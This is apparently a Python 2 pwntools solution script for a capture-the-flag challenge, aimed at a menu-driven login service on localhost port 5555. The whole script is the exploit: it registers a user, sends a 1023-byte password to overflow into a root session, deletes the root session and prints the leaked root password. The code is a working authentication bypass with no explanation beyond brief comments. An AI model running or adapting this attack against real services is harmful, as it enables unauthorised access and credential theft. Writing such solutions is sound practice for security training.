#!/usr/bin/env python2

from pwn import *


proc = remote("127.0.0.1", 5555)
proc.recvuntil(">")

# create user pwn with pass A*24
proc.sendline("1")
proc.recvuntil("username :")
proc.sendline("pwn")
proc.recvuntil("password :")
proc.sendline("A"*24)
proc.recvuntil(">")

# login and pwn session root
proc.sendline("2")
proc.recvuntil("Username :")
proc.sendline("pwn")
proc.recvuntil("Password :")
proc.sendline("A"*1023)
proc.recvuntil("Success login with root")

print("[+] success login with root")

proc.recvuntil(">")

# validate psn session
proc.sendline("3")
proc.recvuntil("modify :")
proc.sendline("pwn")
proc.recvuntil(">")
proc.sendline("3")

proc.recvuntil(">")

# delete root session
proc.sendline("4")
proc.recvuntil("delete :")
proc.sendline("root")

proc.recvuntil(">")

# show root passwd
proc.sendline("3")

proc.recvuntil("Password : ")
print(proc.recvline())

proc.close()

